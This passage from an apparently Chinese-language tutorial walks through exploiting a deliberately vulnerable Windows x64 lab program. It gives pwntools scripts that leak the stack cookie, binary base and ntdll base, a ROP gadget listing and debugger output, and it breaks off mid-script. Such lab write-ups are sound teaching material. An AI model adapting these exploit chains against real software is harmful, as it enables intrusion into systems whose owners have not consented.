* <span class="number">0x100</span></span><br><span class="line">r.sendafter(<span class="string">'input:'</span>, p1)</span><br><span class="line">r.recvuntil(<span class="string">'a'</span> * <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">StackCookie = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'StackCookie = '</span> + <span class="built_in">hex</span>(StackCookie))</span><br><span class="line"></span><br><span class="line">p2 = <span class="string">b'a'</span> * <span class="number">0x118</span></span><br><span class="line">r.sendafter(<span class="string">'input:'</span> ,p2)</span><br><span class="line">r.recvuntil(<span class="string">'a'</span> * <span class="number">0x118</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'leak_addr = '</span> + <span class="built_in">hex</span>(leak_addr))</span><br><span class="line"></span><br><span class="line">binary_base = leak_addr - <span class="number">0x12F4</span></span><br><span class="line">li(<span class="string">'binary_base = '</span> + <span class="built_in">hex</span>(binary_base))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<p>debug细节如下</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received <span class="number">0x131</span> bytes:</span><br><span class="line">    <span class="number">00000000</span>  <span class="number">62</span> <span class="number">75</span> <span class="number">66</span> <span class="number">66</span>  <span class="number">65</span> <span class="number">72</span> <span class="number">3</span>a <span class="number">0</span>d  <span class="number">0</span>a <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  │buff│er:·│·aaa│aaaa│</span><br><span class="line">    <span class="number">00000010</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  │aaaa│aaaa│aaaa│aaaa│</span><br><span class="line">    *</span><br><span class="line">    <span class="number">00000120</span>  <span class="number">61</span> f4 <span class="number">12</span> <span class="number">4</span>c  <span class="number">0</span>c f6 <span class="number">7f</span> <span class="number">0</span>d  <span class="number">0</span>a <span class="number">69</span> <span class="number">6</span>e <span class="number">70</span>  <span class="number">75</span> <span class="number">74</span> <span class="number">3</span>a <span class="number">0</span>d  │a··L│····│·inp│ut:·│</span><br><span class="line">    <span class="number">00000130</span>  <span class="number">0</span>a                                                  │·│</span><br><span class="line">    <span class="number">00000131</span></span><br><span class="line">leak_addr = <span class="number">0x7ff60c4c12f4</span></span><br><span class="line">binary_base = <span class="number">0x7ff60c4c0000</span></span><br></pre></td></tr></tbody></table></figure>

<p>算出<code>binary_base = 0x7ff60c4c0000</code>，验证一下是否正确，直接看windbg前面的信息</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Executable search path is: </span><br><span class="line">ModLoad: <span class="number">00007f</span>f6`<span class="number">0</span>c4c0000 <span class="number">00007f</span>f6`<span class="number">0</span>c4c7000   Z:\easyoverflow\StackOverflow.exe</span><br><span class="line">ModLoad: <span class="number">00007f</span>f8`f3790000 <span class="number">00007f</span>f8`f3b86000   C:\Windows\SYSTEM32\ntdll.dll</span><br><span class="line">ModLoad: <span class="number">00007f</span>f8`f1eb0000 <span class="number">00007f</span>f8`f1fa4000   C:\Windows\System32\xtajit64.dll</span><br><span class="line">ModLoad: <span class="number">00007f</span>f8`f1020000 <span class="number">00007f</span>f8`f117c000   C:\Windows\System32\KERNEL32.DLL</span><br><span class="line">ModLoad: <span class="number">00007f</span>f8`ef810000 <span class="number">00007f</span>f8`efdf9000   C:\Windows\System32\KERNELBASE.dll</span><br><span class="line">ModLoad: <span class="number">00007f</span>f8`eedd0000 <span class="number">00007f</span>f8`eeea8000   C:\Windows\SYSTEM32\apphelp.dll</span><br><span class="line">ModLoad: <span class="number">00007f</span>f8`ef270000 <span class="number">00007f</span>f8`ef464000   C:\Windows\System32\ucrtbase.dll</span><br><span class="line">ModLoad: <span class="number">00007f</span>f8`e6e80000 <span class="number">00007f</span>f8`e6eb5000   C:\Windows\SYSTEM32\VCRUNTIME140.dll</span><br></pre></td></tr></tbody></table></figure>

<p>第二行就是binary的地址区间，基地址一样，证明poc正确</p>
<p>接下来需要打返回地址到main函数使得可以继续利用，值得注意的是因为到main函数之后栈会变，所以需要再次泄露出<code>StackCookie</code>，poc如下</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote('10.211.55.3', 1234)</span></span><br><span class="line">r = remote(<span class="string">'192.168.10.102'</span>, <span class="number">1234</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b'a'</span> * <span class="number">0x100</span></span><br><span class="line">r.sendafter(<span class="string">'input:'</span>, p1)</span><br><span class="line">r.recvuntil(<span class="string">'a'</span> * <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">StackCookie = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'StackCookie = '</span> + <span class="built_in">hex</span>(StackCookie))</span><br><span class="line"></span><br><span class="line">p2 = <span class="string">b'a'</span> * <span class="number">0x118</span></span><br><span class="line">r.sendafter(<span class="string">'input:'</span> ,p2)</span><br><span class="line">r.recvuntil(<span class="string">'a'</span> * <span class="number">0x118</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'leak_addr = '</span> + <span class="built_in">hex</span>(leak_addr))</span><br><span class="line"></span><br><span class="line">binary_base = leak_addr - <span class="number">0x12F4</span></span><br><span class="line">li(<span class="string">'binary_base = '</span> + <span class="built_in">hex</span>(binary_base))</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x1000</span> + binary_base</span><br><span class="line"></span><br><span class="line">p3 = <span class="string">b'a'</span> * <span class="number">0x100</span></span><br><span class="line">p3 += p64(StackCookie)</span><br><span class="line">p3 += <span class="string">b'a'</span> * <span class="number">0x10</span></span><br><span class="line">p3 += p64(main_addr)</span><br><span class="line">r.sendafter(<span class="string">'input:'</span>, p3)</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">'input:'</span>, p1)</span><br><span class="line">r.recvuntil(<span class="string">'a'</span> * <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">StackCookie = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'StackCookie = '</span> + <span class="built_in">hex</span>(StackCookie))</span><br></pre></td></tr></tbody></table></figure>

<h3 id="ret2dll"><a href="#ret2dll" class="headerlink" title="ret2dll"></a>ret2dll</h3><p>接下来就可以利用ret2dll的方法来getshell，第一步泄露出dll_base，上一节已经学过了利用iat表来泄露出dll_base，但是这个程序是64位的，参数通过寄存器传递，顺序是 <code>rcx rdx r8 r9</code></p>
<p>所以笔者用Ropgadget找了一下发现gadgets很少几乎用不了</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">➜  easyoverflow ROPgadget --binary StackOverflow.exe --only <span class="string">'pop|ret'</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line"><span class="number">0x00000001400017ee</span> : pop rbp ; ret</span><br><span class="line"><span class="number">0x00000001400010c9</span> : pop rbx ; ret</span><br><span class="line"><span class="number">0x00000001400014ed</span> : pop rdi ; pop rsi ; pop rbx ; ret</span><br><span class="line"><span class="number">0x000000014000133d</span> : pop rdi ; ret</span><br><span class="line"><span class="number">0x00000001400014ee</span> : pop rsi ; pop rbx ; ret</span><br><span class="line"><span class="number">0x00000001400010ca</span> : ret</span><br><span class="line"><span class="number">0x0000000140001818</span> : ret <span class="number">0</span></span><br><span class="line"><span class="number">0x0000000140001723</span> : ret <span class="number">0x8348</span></span><br><span class="line"><span class="number">0x0000000140001643</span> : ret <span class="number">0xb70f</span></span><br><span class="line"><span class="number">0x0000000140001678</span> : ret <span class="number">0xeb28</span></span><br><span class="line"><span class="number">0x0000000140001d12</span> : ret <span class="number">3</span></span><br></pre></td></tr></tbody></table></figure>

<p>在CTF PWN中，可以通过泄露出libc然后用libc的gadgets，但是win下就不一样，因为没有可用的gadgets，所以需要借助ntdll.dll这个dll来寻找可用的gadgets，为什么是ntdll.dll呢，因为在main函数调用之前会调用ntdll.dll，所以可以泄露出这上面的地址，寻找一下</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ModLoad: <span class="number">00007f</span>ff`<span class="number">2</span>da80000 <span class="number">00007f</span>ff`<span class="number">2</span>dc89000   C:\WINDOWS\SYSTEM32\ntdll.dll</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dq rsp + <span class="number">0x170</span></span><br><span class="line"><span class="number">00000010</span>`d33ffb88  <span class="number">61616161</span>`<span class="number">61616161</span> <span class="number">61616161</span>`<span class="number">61616161</span></span><br><span class="line"><span class="number">00000010</span>`d33ffb98  <span class="number">61616161</span>`<span class="number">61616161</span> <span class="number">61616161</span>`<span class="number">61616161</span></span><br><span class="line"><span class="number">00000010</span>`d33ffba8  <span class="number">61616161</span>`<span class="number">61616161</span> <span class="number">61616161</span>`<span class="number">61616161</span></span><br><span class="line"><span class="number">00000010</span>`d33ffbb8  <span class="number">00007f</span>ff`<span class="number">2</span>da8485b <span class="number">00000000</span>`<span class="number">00000000</span></span><br></pre></td></tr></tbody></table></figure>

<p>在<code>10d33ffba8</code>这里存放的地址就是ntdll.dll上的地址，算一下偏移在0x180，并且泄露的地址与base偏移为<code>0x485b</code>所以构造如下exp</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote('10.211.55.3', 1234)</span></span><br><span class="line">r = remote(<span class="string">'192.168.10.102'</span>, <span class="number">1234</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b'a'</span> * <span class="number">0x100</span></span><br><span class="line">r.sendafter(<span class="string">'input:'</span>, p1)</span><br><span class="line">r.recvuntil(<span class="string">'a'</span> * <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">StackCookie = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'StackCookie = '</span> + <span class="built_in">hex</span>(StackCookie))</span><br><span class="line"></span><br><span class="line">p2 = <span class="string">b'a'</span> * <span class="number">0x118</span></span><br><span class="line">r.sendafter(<span class="string">'input:'</span> ,p2)</span><br><span class="line">r.recvuntil(<span class="string">'a'</span> * <span class="number">0x118</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'leak_addr = '</span> + <span class="built_in">hex</span>(leak_addr))</span><br><span class="line"></span><br><span class="line">binary_base = leak_addr - <span class="number">0x12F4</span></span><br><span class="line">li(<span class="string">'binary_base = '</span> + <span class="built_in">hex</span>(binary_base))</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x1000</span> + binary_base</span><br><span class="line"></span><br><span class="line">p3 = <span class="string">b'a'</span> * <span class="number">0x100</span></span><br><span class="line">p3 += p64(StackCookie)</span><br><span class="line">p3 += <span class="string">b'a'</span> * <span class="number">0x10</span></span><br><span class="line">p3 += p64(main_addr)</span><br><span class="line">r.sendafter(<span class="string">'input:'</span>, p3)</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">'input:'</span>, p1)</span><br><span class="line">r.recvuntil(<span class="string">'a'</span> * <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">StackCookie = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'StackCookie = '</span> + <span class="built_in">hex</span>(StackCookie))</span><br><span class="line"></span><br><span class="line">p4 = <span class="string">b'a'</span> * <span class="number">0x180</span></span><br><span class="line">r.sendafter(<span class="string">'input:'</span>, p4)</span><br><span class="line">r.recvuntil(<span class="string">'a'</span> * <span class="number">0x180</span>)</span><br><span class="line"></span><br><span class="line">ntdll_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'ntdll_addr = '</span> + <span class="built_in">hex</span>(ntdll_addr))</span><br><span class="line"></span><br><span class="line">ntdll_base = ntdll_addr - <span class="number">0x485b</span></span><br><span class="line">li(<span class="string">'ntdll_base = '</span> + <span class="built_in">hex</span>(ntdll_base))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<p>输出的地址正确，因为有aslr的存在，所以地址肯定是随机的，这就造成了上面有时候地址不一样，需要注意的是这里笔者换成了实机，因为arm windows11支持了x64的程序</p>
<blockquote>
<p>相应的x64程序的公用DLL和ARM64程序使用的公用DLL一样都会存放在System32目录下。实际上，原来的ARM64系统DLL都已经进化成ARM64x ABI的混合DLL，这些DLL中的机器码主要仍是ARM64 native的，ARM64程序仍然能以最高效率调用里面导出的函数。同时增加了对x64程序基于JIT指令转译模拟执行时调用相关导出函数的支持，主要是将x64调用约定转换为对相应的ARM64函数的调用，执行结果处理则反之。这样可以提高执行效率，因为如果直接使用自Win10 x64版本的System32目录复制过来的x64 DLL的话，DLL中的机器码也需要指令转译，从而影响了执行效率。可能有点像Win10 on ARM下执行x86程序时调用系统常用的DLL使用SyChpe32中的CHPE DLL以提高执行效率的策略。</p>
</blockquote>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received <span class="number">0x193</span> bytes:</span><br><span class="line">    <span class="number">00000000</span>  <span class="number">3</span>a <span class="number">0</span>d <span class="number">0</span>a <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  │:··a│aaaa│aaaa│aaaa│</span><br><span class="line">    <span class="number">00000010</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  │aaaa│aaaa│aaaa│aaaa│</span><br><span class="line">    *</span><br><span class="line">    <span class="number">00000180</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">5b</span>  <span class="number">48</span> a8 <span class="number">2</span>d ff  <span class="number">7f</span> <span class="number">0</span>d <span class="number">0</span>a <span class="number">69</span>  <span class="number">6</span>e <span class="number">70</span> <span class="number">75</span> <span class="number">74</span>  │aaa[│H·-·│···i│nput│</span><br><span class="line">    <span class="number">00000190</span>  <span class="number">3</span>a <span class="number">0</span>d <span class="number">0</span>a                                            │:··│</span><br><span class="line">    <span class="number">00000193</span></span><br><span class="line">ntdll_addr = <span class="number">0x7fff2da8485b</span></span><br><span class="line">ntdll_base = <span class="number">0x7fff2da80000</span></span><br></pre></td></tr></tbody></table></figure>

<p>拿到ntdll的地址之后寻找需要用的gadgets，也就是能控制rcx的还有rbx，为什么还有个rbx，看下面的汇编</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">dec     ebx</span><br><span class="line">call    memset</span><br><span class="line">lea     rcx, Buffer     ; "input:"</span><br><span class="line">call    cs:puts</span><br><span class="line">mov     r8d, 400h       ; MaxCharCount</span><br><span class="line">lea     rdx, [rsp+138h+DstBuf] ; DstBuf</span><br><span class="line">xor     ecx, ecx        ; FileHandle</span><br><span class="line">call    cs:_read</span><br><span class="line">lea     rcx, aBuffer    ; "buffer:"</span><br><span class="line">call    cs:puts</span><br><span class="line">lea     rcx, [rsp+138h+DstBuf] ; Buffer</span><br><span class="line">call    cs:puts</span><br><span class="line">test    ebx, ebx</span><br><span class="line">jg      short loc_7FF60C4C1060</span><br></pre></td></tr></tbody></table></figure>

<p>通过rbx来控制循环次数，所以控制了rbx为1之后就可以继续执行rop，找到gadgets之后就需要构造rop了，在构造rop的时候会发现失败，排查下来可以发现是rsp的原因</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; r</span><br><span class="line">rax=<span class="number">0000000000000140</span> rbx=<span class="number">0000000000000000</span> rcx=<span class="number">00000000f</span>fffffff</span><br><span class="line">rdx=<span class="number">00000245250</span>cc230 rsi=<span class="number">0000000000000000</span> rdi=<span class="number">00000245250</span>d0020</span><br><span class="line">rip=<span class="number">00007f</span>f678e11094 rsp=<span class="number">000000f</span>986aff928 rbp=<span class="number">0000000000000000</span></span><br><span class="line"> r8=<span class="number">0000000000000140</span>  r9=<span class="number">00007f</span>ff2b7909a0 r10=<span class="number">0000000000000000</span></span><br><span class="line">r11=<span class="number">000000000000019</span>c r12=<span class="number">0000000000000000</span> r13=<span class="number">0000000000000000</span></span><br><span class="line">r14=<span class="number">0000000000000000</span> r15=<span class="number">0000000000000000</span></span><br><span class="line">iopl=<span class="number">0</span>         nv up ei pl nz na pe nc</span><br><span class="line">cs=<span class="number">0033</span>  ss=<span class="number">002b</span>  ds=<span class="number">002b</span>  es=<span class="number">002b</span>  fs=<span class="number">0053</span>  gs=<span class="number">002b</span>             efl=<span class="number">00000202</span></span><br><span class="line">StackOverflow+<span class="number">0x1094</span>:</span><br><span class="line"><span class="number">00007f</span>f6`<span class="number">78e11094</span> <span class="number">488</span>d0dbd110000  lea     rcx,[StackOverflow+<span class="number">0x2258</span> (<span class="number">00007f</span>f6`<span class="number">78e12258</span>)]</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; g</span><br><span class="line">Breakpoint <span class="number">0</span> hit</span><br><span class="line">StackOverflow+<span class="number">0x1094</span>:</span><br><span class="line"><span class="number">00007f</span>f6`<span class="number">78e11094</span> <span class="number">488</span>d0dbd110000  lea     rcx,[StackOverflow+<span class="number">0x2258</span> (<span class="number">00007f</span>f6`<span class="number">78e12258</span>)]</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; r</span><br><span class="line">rax=<span class="number">0000000000000140</span> rbx=<span class="number">0000000000000000</span> rcx=<span class="number">00000000f</span>fffffff</span><br><span class="line">rdx=<span class="number">00000245250</span>cc230 rsi=<span class="number">0000000000000000</span> rdi=<span class="number">00000245250</span>d0020</span><br><span class="line">rip=<span class="number">00007f</span>f678e11094 rsp=<span class="number">000000f</span>986affa88 rbp=<span class="number">0000000000000000</span></span><br><span class="line"> r8=<span class="number">0000000000000140</span>  r9=<span class="number">00007f</span>ff2b7909a0 r10=<span class="number">0000000000000000</span></span><br><span class="line">r11=<span class="number">000000000000019</span>c r12=<span class="number">0000000000000000</span> r13=<span class="number">0000000000000000</span></span><br><span class="line">r14=<span class="number">0000000000000000</span> r15=<span class="number">0000000000000000</span></span><br></pre></td></tr></tbody></table></figure>

<p>因为rsp的值改变了，所以最后<code>check cookie</code>会不通过，所以需要重新计算<code>StackCookie</code>，也就是泄露出<code>security_cookie</code>，再计算出新的rsp（<code>000000f986affa88 - 000000f986aff928 = 0x160 </code>），所以exp如下</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote('10.211.55.3', 1234)</span></span><br><span class="line">r = remote(<span class="string">'192.168.10.102'</span>, <span class="number">1234</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b'a'</span> * <span class="number">0x100</span></span><br><span class="line">r.sendafter(<span class="string">'input:'</span>, p1)</span><br><span class="line">r.recvuntil(<span class="string">'a'</span> * <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">StackCookie = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'StackCookie = '</span> + <span class="built_in">hex</span>(StackCookie))</span><br><span class="line"></span><br><span class="line">p2 = <span class="string">b'a'</span> * <span class="number">0x118</span></span><br><span class="line">r.sendafter(<span class="string">'input:'</span> ,p2)</span><br><span class="line">r.recvuntil(<span class="string">'a'</span> * <span class="number">0x118</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'leak_addr = '</span> + <span class="built_in">hex</span>(leak_addr))</span><br><span class="line"></span><br><span class="line">binary_base = leak_addr - <span class="number">0x12F4</span></span><br><span class="line">li(<span class="string">'binary_base = '</span> + <span class="built_in">hex</span>(binary_base))</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x1000</span> + binary_base</span><br><span class="line"></span><br><span class="line">p3 = <span class="string">b'a'</span> * <span class="number">0x100</span></span><br><span class="line">p3 += p64(StackCookie)</span><br><span class="line">p3 += <span class="string">b'a'</span> * <span class="number">0x10</span></span><br><span class="line">p3 += p64(main_addr)</span><br><span class="line">r.sendafter(<span class="string">'input:'</span>, p3)</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">'input:'</span>, p1)</span><br><span class="line">r.recvuntil(<span class="string">'a'</span> * <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">StackCookie = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'StackCookie = '</span> + <span class="built_in">hex</span>(StackCookie))</span><br><span class="line"></span><br><span class="line">p4 = <span class="string">b'a'</span> * <span 